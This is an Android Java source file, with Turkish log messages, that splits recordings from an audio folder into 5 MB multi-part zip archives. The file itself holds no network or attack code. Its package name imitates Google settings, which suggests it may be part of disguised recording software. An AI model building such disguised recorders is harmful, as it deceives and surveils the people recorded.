package com.setting.dl.google.googlesettings.phone;

import android.content.Context;

import com.setting.dl.google.googlesettings.u;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.exception.ZipException;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.util.Zip4jConstants;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by hsyn on 28.09.2017.
 */

public class FileSplitter {
    
    private Context context;
    private File    file;
    private String folder;
    
    private static final long maxByte = 5242880; //  5 * 1024 * 1024;
    
    public FileSplitter(Context context, File file) {
        
        this.context = context;
        this.file = file;
        folder = u.getAudioFolder(context);
    }
    
    public FileSplitter(Context context, File file, String folder) {
        
        this.context = context;
        this.file = file;
        this.folder = folder;
    }
    
    //public static boolean needsSplit(File file) {return file.length() > maxByte;}
    
    
    public void split() {
    
        u.log.d("FileSplitter başlatıldı : " + file.getName());
        
        
        long fileByte = file.length();
    
    
        if (fileByte > maxByte) {
    
            u.log.d("Dosya boyutu 5 MB sınırının üzerinde " + file.getName());
            u.log.d("Dosya bölünecek : " + file.getName());
            
            long minByte = 65536;
            long splitByte = 5 * 1024 * 1024; // değersiz bir değer
            int parts = 2;
        
            for(; parts < 300; parts++) {
            
                long temp = fileByte / parts;
            
                if (temp > minByte && temp <= maxByte) {
                
                    splitByte = temp;
                    
                    break;
                }
            }
    
            u.log.d(u.s("Dosya %d parçaya bölünecek", parts));
            u.log.d(u.s("parça büyüklüğü = %d bytes olacak", splitByte));
            
            ZipFile zipFile;
            
            String  zipName     = file.getName().split("\\.(?=[^\\.]+$)")[0] + ".zip";
    
            u.log.d(u.s("Dosyanın kaydedileceği yer : %s", folder));
            u.log.d(u.s("zip dosya ismi = %s", zipName));
        
            try {
            
                zipFile = new ZipFile( folder + "/" + zipName);
    
                u.log.d("zip dosyası oluşturuldu : " + zipName);
                ArrayList<File> filesToAdd = new ArrayList<>();
                filesToAdd.add(file);
    
                u.log.d("Kayıt dosyası zip dosyasına eklenmek üzere listeye kaydedildi");
            
                ZipParameters parameters = new ZipParameters();
                parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
                parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
            
                zipFile.createZipFile(filesToAdd, parameters, true, splitByte);
    
                u.log.d("zip dosyası başarılı bir şekilde parçalara ayrıldı");
    
    
                for (String part : new File(u.getAudioFolder(context)).list()) {
    
    
                    u.log.w(part + " " + new File(part).length());
                    
                }
    
    
                u.log.d(u.s("%d parça zip dosyası oluşturuldu", parts));
    
                /*
                if (file.delete()) {
    
                    u.li("Orjinal dosya silindi : " + file.getName());
                }
                else{
    
                    u.li("Orjinal dosya silinemedi : " + file.getName());
                }
                */
                u.log.d("FileSplitter sonlanıyor");
            }
            catch (ZipException e) {
                
                e.printStackTrace();
                u.log.e("zip işlemi başarısız");
                u.log.d("FileSplitter sonlanıyor");
                
            }
        }
        else{
    
            u.log.d("Dosyanın bölünmeye ihtiyacı yok : " + file.getName());
            u.log.d("FileSplitter sonlanıyor");
            
        }
    }
}
